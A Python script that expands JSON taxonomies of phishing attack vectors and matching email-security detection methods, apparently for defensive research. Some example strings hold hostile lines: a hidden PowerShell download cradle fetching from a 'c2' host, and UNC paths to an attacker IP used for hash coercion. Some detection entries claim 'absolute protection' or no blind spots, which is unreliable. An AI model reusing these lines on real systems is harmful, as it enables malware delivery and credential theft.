"""
Expand Reasons and Validation Taxonomies with Advanced Real-World Vectors
"""
import json
import os

REASONS_FILE = 'research/fake_email_reasons/comprehensive_reasons_taxonomy.json'
VALIDATION_FILE = 'research/validation_methods/comprehensive_validation_taxonomy.json'

def expand_reasons():
    with open(REASONS_FILE, 'r', encoding='utf-8') as f:
        data = json.load(f)
    
    # 1. Update MOTIVE-01
    dim1 = next(d for d in data['dimensions'] if d['category_id'] == 'MOTIVE-01-FINANCIAL-FRAUD')
    existing_dim1_names = {v['name'] for v in dim1['sub_vectors']}
    new_dim1 = [
        {
            "name": "Payroll Direct Deposit Diversion Scheme",
            "target": "Human Resources, Payroll Specialists, Corporate Controllers",
            "mechanism": "Attacker impersonates an employee or hacks their self-service HR portal to update direct deposit banking transit routing numbers prior to payroll cutoff.",
            "psychological_trigger": "Urgency + Administrative Routine Compliance",
            "real_world_example": "Email from 'employee' requesting payroll clerk to update direct deposit account to a Green Dot prepaid debit card."
        },
        {
            "name": "Vendor Email Compromise (VEC) / Supply Chain Account Modification",
            "target": "Accounts Payable, Procurement Managers, Billing Teams",
            "mechanism": "Compromised legitimate vendor email account injects into existing invoice thread or uses typosquatted supplier domain to modify wire remittance instructions.",
            "psychological_trigger": "Pre-established Inter-organizational Trust + Plausibility",
            "real_world_example": "Supplier's real email account hijacked to send an 'updated banking coordinate notice due to annual bank audit'."
        },
        {
            "name": "Fake Subscription Auto-Renewal & Refund Scams (Baiting / Vishing Pivot)",
            "target": "General Consumers, Corporate Employees",
            "mechanism": "Invoices for exorbitant charges ($499-$899 for Geek Squad/Norton/McAfee) urging victim to call a toll-free call center to cancel or request refund, pivoting to remote-access Trojan (AnyDesk/TeamViewer).",
            "psychological_trigger": "Loss Aversion + Financial Alarm + False Rescue",
            "real_world_example": "Email stating '$799 Geek Squad Total Protection renewed. Call 1-800-XXX-XXXX immediately if you did not authorize this charge.'"
        }
    ]
    for v in new_dim1:
        if v['name'] not in existing_dim1_names:
            dim1['sub_vectors'].append(v)

    # 2. Update MOTIVE-02
    dim2 = next(d for d in data['dimensions'] if d['category_id'] == 'MOTIVE-02-CREDENTIAL-HARVESTING')
    existing_dim2_names = {v['name'] for v in dim2['sub_vectors']}
    new_dim2 = [
        {
            "name": "Adversary-in-the-Middle (AitM) Reverse Proxy Phishing",
            "target": "Corporate Users with Multi-Factor Authentication (MFA)",
            "mechanism": "Deploying reverse proxies (Evilginx2/3, Modlishka, Muraena) that relay real IdP login pages, intercepting session cookies (ESTSAUTH, persistent cookies) and bypassing SMS/TOTP/Push MFA.",
            "psychological_trigger": "Seamless Familiarity + Routine Authentication",
            "real_world_example": "Lookalike Microsoft 365 login portal that proxies official MFA prompt, captures session cookie, and establishes persistent session."
        },
        {
            "name": "Quishing (QR Code Phishing) Mobile Pivot",
            "target": "Hybrid Workers, Mobile Users",
            "mechanism": "Embedding QR codes in email body or attached PDF/PNG claiming MFA reconfiguration or urgent document review, forcing user off monitored corporate workstations onto personal mobile devices.",
            "psychological_trigger": "Curiosity + Friction Shift + Trust in Modern Auth",
            "real_world_example": "Email displaying 'Microsoft Authenticator 2FA Security Update Required: Scan QR code with mobile camera to re-verify.'"
        }
    ]
    for v in new_dim2:
        if v['name'] not in existing_dim2_names:
            dim2['sub_vectors'].append(v)

    # 3. Update MOTIVE-03
    dim3 = next(d for d in data['dimensions'] if d['category_id'] == 'MOTIVE-03-MALWARE-DISTRIBUTION')
    existing_dim3_names = {v['name'] for v in dim3['sub_vectors']}
    new_dim3 = [
        {
            "name": "Mark-of-the-Web (MOTW) Container Evasion (ISO / VHD / IMG Containers)",
            "target": "Windows Enterprise Endpoints",
            "mechanism": "Encapsulating malicious binaries or LNK scripts inside disk image containers (.iso, .vhd, .img) which, when mounted natively in Windows, stripped Mark-of-the-Web Zone.Identifier tags.",
            "psychological_trigger": "Document Inspection Expectation",
            "real_world_example": "Email attachment named 'Purchase_Order_March.iso' containing a hidden .bat loader and decoy PDF."
        },
        {
            "name": "Weaponized OneNote (.one) Malicious Document Delivery",
            "target": "Corporate Knowledge Workers",
            "mechanism": "Delivering Microsoft OneNote notebooks containing clickable graphic buttons overlaying hidden executable scripts (.wsf, .bat, .hta, .cmd) to circumvent macro restrictions.",
            "psychological_trigger": "Visual Deception + UI Obfuscation ('Click to Open')",
            "real_world_example": "OneNote attachment with a graphic button 'Double-click to view secure invoice' hiding a PowerShell download cradle."
        },
        {
            "name": "Windows Shell Link (.lnk) Shortcut Masquerading",
            "target": "Enterprise Desktop Users",
            "mechanism": "Crafting .lnk shortcut files with customized document icons (PDF/Excel) containing obfuscated CommandLineArguments that invoke PowerShell or MSHTA.",
            "psychological_trigger": "Icon Mimicry + Inertia of Clicking Known Formats",
            "real_world_example": "A file named 'Tax_Statement_2025.pdf.lnk' that launches powershell -windowstyle hidden (curl http://c2/payload.bin | iex)."
        },
        {
            "name": "HTML Smuggling via JavaScript Blobs & Programmatic Anchor Trigger",
            "target": "All Operating Systems & Cloud Mailboxes",
            "mechanism": "Encoding malicious binary in Base64 within HTML file; client-side JS constructs a Blob, creates blob URL, and programmatically triggers anchor download, bypassing network inspection.",
            "psychological_trigger": "Secure Portal / Encrypted Message Simulation",
            "real_world_example": "HTML attachment claiming 'Encrypted DocuSign Message'; upon opening, JavaScript assembles password-protected ZIP on the endpoint."
        }
    ]
    for v in new_dim3:
        if v['name'] not in existing_dim3_names:
            dim3['sub_vectors'].append(v)

    # 4. Update MOTIVE-04
    dim4 = next(d for d in data['dimensions'] if d['category_id'] == 'MOTIVE-04-OAUTH-ABUSE')
    existing_dim4_names = {v['name'] for v in dim4['sub_vectors']}
    new_dim4 = [
        {
            "name": "Device Authorization Grant Abuse (RFC 8628 Device Code Phishing)",
            "target": "Corporate Cloud Identity Accounts",
            "mechanism": "Luring victim to visit legitimate Microsoft/Google device login endpoint (e.g. microsoft.com/devicelogin) and enter attacker-supplied code, granting attacker full OAuth tokens without password theft.",
            "psychological_trigger": "Trust in Legitimate Identity Provider URLs",
            "real_world_example": "Phishing message directing user to 'https://microsoft.com/devicelogin' to enter pairing code 'ABCD-EFGH' to verify corporate device."
        },
        {
            "name": "Multi-Tenant Enterprise Malicious App Registration",
            "target": "Corporate Office 365 / Google Workspace Tenants",
            "mechanism": "Attacker creates third-party cloud app requesting high-privilege scopes ('Mail.ReadWrite', 'Files.ReadWrite.All', 'offline_access') masquerading as an IT security audit scanner.",
            "psychological_trigger": "Authority + Legitimate OAuth Dialog Familiarity",
            "real_world_example": "OAuth consent popup requesting permissions for 'Anti-Spam Cloud Scanner' published by an unverified multi-tenant app."
        }
    ]
    for v in new_dim4:
        if v['name'] not in existing_dim4_names:
            dim4['sub_vectors'].append(v)

    # 5. Update MOTIVE-05
    dim5 = next(d for d in data['dimensions'] if d['category_id'] == 'MOTIVE-05-ESPIONAGE-RECON')
    existing_dim5_names = {v['name'] for v in dim5['sub_vectors']}
    new_dim5 = [
        {
            "name": "UNC Path NetNTLMv2 Hash Coercion (Ghost Image SMB Poisoning)",
            "target": "Windows Domain Joined Hosts",
            "mechanism": "Embedding remote UNC paths in HTML markup (<img src='\\\\attacker-ip\\share\\logo.png'> or CSS @import) forcing Outlook to attempt NTLM authentication, leaking NetNTLMv2 challenge-response hashes.",
            "psychological_trigger": "Zero-click Automatic Rendering in Mail Client",
            "real_world_example": "HTML email with hidden 1x1 image pointing to an attacker SMB listener (Responder) capturing Windows credentials on open."
        },
        {
            "name": "Web Beacon & Tracking Pixel Reconnaissance (Active Mailbox Triage)",
            "target": "Corporate Executives, VIPs, Sensitive Role Holders",
            "mechanism": "Embedding unique tracking pixels with dynamic URL parameters to log exact timestamp, IP address, user-agent, and read frequency to validate active targets before launching spear-phishing.",
            "psychological_trigger": "Silent Infiltration / Curiosity Baiting",
            "real_world_example": "Newsletter containing <img src='https://tracker.org/img?uid=e49b82f'> logging target's work hours and mobile vs desktop client."
        },
        {
            "name": "Directory Harvest Attack (DHA) & SMTP Probe Scanning",
            "target": "Corporate Mail Transfer Agents (MTAs)",
            "mechanism": "Automated brute-forcing of email addresses against an MTA, analyzing SMTP response codes (250 OK vs 550 User Unknown) to map valid internal corporate mailboxes.",
            "psychological_trigger": "Technical Protocol Reconnaissance",
            "real_world_example": "Botnet spraying thousands of firstname.lastname@company.com permutations to build a high-fidelity organizational target list."
        }
    ]
    for v in new_dim5:
        if v['name'] not in existing_dim5_names:
            dim5['sub_vectors'].append(v)

    with open(REASONS_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    
    total_vectors = sum(len(d['sub_vectors']) for d in data['dimensions'])
    print(f"[REASONS] Successfully expanded taxonomy. Total Dimensions: {len(data['dimensions'])}, Total Sub-Vectors: {total_vectors}")

def expand_validation():
    with open(VALIDATION_FILE, 'r', encoding='utf-8') as f:
        data = json.load(f)
    
    # Layer 4: Domain, Hostname & URL Forensics
    l4 = next(l for l in data['layers'] if l['layer_id'] == 'LAYER-04-DOMAIN-URL')
    existing_l4 = {m['code'] for m in l4['methods']}
    new_l4 = [
        {
            "code": "VAL-33-QUISHING-STATIC",
            "name": "Static QR Code Matrix Pre-Navigation Extraction & Analysis",
            "mechanism": "Scans embedded image raster/vector elements and PDF attachments for 2D barcode matrices (QR, DataMatrix), decodes payload string, and subjects decoded URI to static lexical checks without initiating HTTP navigation.",
            "status_outcomes": ["clean", "qr_payload_malicious", "qr_payload_suspicious", "no_qr_found"],
            "threats_stopped": "Quishing attacks designed to bypass textual URL scanners and shift victims to unmonitored personal mobile devices.",
            "blind_spots": "Heavily distorted, damaged, or adversarial steganographic QR patterns that fail static optical decoding."
        },
        {
            "code": "VAL-34-DEVICE-LOGIN-URL",
            "name": "RFC 8628 Device Authorization Grant Endpoint & Code Detection",
            "mechanism": "Detects links pointing to legitimate identity provider device pairing endpoints (e.g., microsoft.com/devicelogin, google.com/device) accompanied by pairing codes in the body or URL parameters.",
            "status_outcomes": ["clean", "device_code_phishing_detected"],
            "threats_stopped": "Device Code Phishing campaigns that grant attackers full API tokens without stealing passwords.",
            "blind_spots": "Legitimate enterprise device onboarding emails matching identical workflows."
        }
    ]
    for m in new_l4:
        if m['code'] not in existing_l4:
            l4['methods'].append(m)

    # Layer 5: Semantic, Cognitive & Lexical Forensics
    l5 = next(l for l in data['layers'] if l['layer_id'] == 'LAYER-05-SEMANTIC-NLP')
    existing_l5 = {m['code'] for m in l5['methods']}
    new_l5 = [
        {
            "code": "VAL-38-ZERO-WIDTH-SANITIZATION",
            "name": "Zero-Width Character Sanitization & Homoglyph De-obfuscation",
            "mechanism": "Pre-processes email body text by stripping invisible Unicode control codepoints (U+200B, U+200C, U+200D, U+FEFF, U+00AD) and normalizing confusables before evaluating keyword heuristics.",
            "status_outcomes": ["clean", "invisible_characters_stripped", "keyword_evasion_detected"],
            "threats_stopped": "Zero-width character insertion used to split keywords and defeat regex/string-matching filters.",
            "blind_spots": "Does not catch complex mathematical substitution alphabets if outside UTS #39 confusable tables."
        },
        {
            "code": "VAL-39-ZEROFONT-CSS-INSPECTION",
            "name": "ZeroFont & Hidden CSS Display Anomaly Detection",
            "mechanism": "Inspects inline CSS styles and HTML attributes for text hiding techniques including font-size:0px, display:none, visibility:hidden, opacity:0, or foreground color matching background hex code.",
            "status_outcomes": ["clean", "hidden_text_detected", "zerofont_evasion_flagged"],
            "threats_stopped": "ZeroFont attacks that inject invisible benign text to manipulate NLP bayesian filters and AI summarizers.",
            "blind_spots": "Complex external CSS stylesheets loaded remotely (blocked in offline static analysis)."
        },
        {
            "code": "VAL-40-UNC-HASH-LEAK-PROBE",
            "name": "Remote UNC Path (\\\\) & SMB Hash Coercion Link Inspection",
            "mechanism": "Scans HTML markup, RTF objects, and CSS declarations for remote Universal Naming Convention (UNC) paths (\\\\attacker-ip\\share) or file:// URIs pointing to non-loopback destinations.",
            "status_outcomes": ["clean", "unc_path_hash_leak_detected"],
            "threats_stopped": "NetNTLMv2 hash harvesting attacks that exploit automatic image or style rendering in desktop mail clients.",
            "blind_spots": "None in static parsing; absolute protection against UNC coercion."
        }
    ]
    for m in new_l5:
        if m['code'] not in existing_l5:
            l5['methods'].append(m)

    # Layer 6: Static In-Memory Attachment Forensics
    l6 = next(l for l in data['layers'] if l['layer_id'] == 'LAYER-06-STATIC-ATTACHMENTS')
    existing_l6 = {m['code'] for m in l6['methods']}
    new_l6 = [
        {
            "code": "VAL-46-CONTAINER-MOTW",
            "name": "Container Image Inspection (.iso, .vhd, .img) for Smuggled Executables",
            "mechanism": "Statically parses ISO 9660 / UDF / VHD filesystem headers in memory without mounting, listing directory structures and flagging encapsulated high-risk scripts or executables.",
            "status_outcomes": ["clean", "container_executable_detected", "malformed_disk_image"],
            "threats_stopped": "Mark-of-the-Web (MOTW) container evasion attacks distributing Qakbot, Bumblebee, and Emotet loaders.",
            "blind_spots": "Encrypted or proprietary disk image formats lacking open filesystem specifications."
        },
        {
            "code": "VAL-47-LNK-BINARY-STRUCTURE",
            "name": "Shell Link (.lnk) Binary Header & Command Arguments Static Parser",
            "mechanism": "Validates Windows Shell Link binary header (CLSID 00021401-0000-0000-C000-000000000046), parses LinkFlags, extracts StringData CommandLineArguments, and flags script interpreter invocations (powershell, cmd, mshta, wscript).",
            "status_outcomes": ["clean", "malicious_shortcut_detected", "suspicious_arguments_found"],
            "threats_stopped": "Weaponized shortcut files masquerading as PDF or spreadsheet documents.",
            "blind_spots": "None for standard MS-SHLLINK structures; completely parses argument strings statically."
        },
        {
            "code": "VAL-48-ONENOTE-EMBEDDED",
            "name": "OneNote (.one) Binary Revision Store Parser for Embedded Payloads",
            "mechanism": "Parses MS-ONESTORE binary header (guidFile {7B5C52E4-D882-4DA1-AC5F-53C20F036706}), traverses FileDataStoreList, and extracts declared embedded file extensions and magic signatures.",
            "status_outcomes": ["clean", "embedded_script_detected", "embedded_executable_detected"],
            "threats_stopped": "OneNote notebook attachments harboring hidden executable payload overlays.",
            "blind_spots": "Heavily corrupted or non-standard revision stream offsets."
        },
        {
            "code": "VAL-49-SVG-SCRIPT-SMUGGLING",
            "name": "SVG Vector XML Static Parser for Script & ForeignObject Injection",
            "mechanism": "Parses SVG XML documents for active scripting tags (<script>, onload, onclick, javascript: URIs) and HTML foreignObject elements capable of executing browser-side code or HTML smuggling.",
            "status_outcomes": ["clean", "svg_script_detected", "svg_smuggling_flagged"],
            "threats_stopped": "SVG-based HTML smuggling, phishing credential prompts, and cross-site scripting inside email readers.",
            "blind_spots": "None; comprehensive XML element traversal catches all active nodes."
        }
    ]
    for m in new_l6:
        if m['code'] not in existing_l6:
            l6['methods'].append(m)

    total_methods = sum(len(l['methods']) for l in data['layers'])
    data['total_methods'] = total_methods
    
    with open(VALIDATION_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
    
    print(f"[VALIDATION] Successfully expanded taxonomy. Total Layers: {len(data['layers'])}, Total Methods: {total_methods}")

if __name__ == '__main__':
    expand_reasons()
    expand_validation()
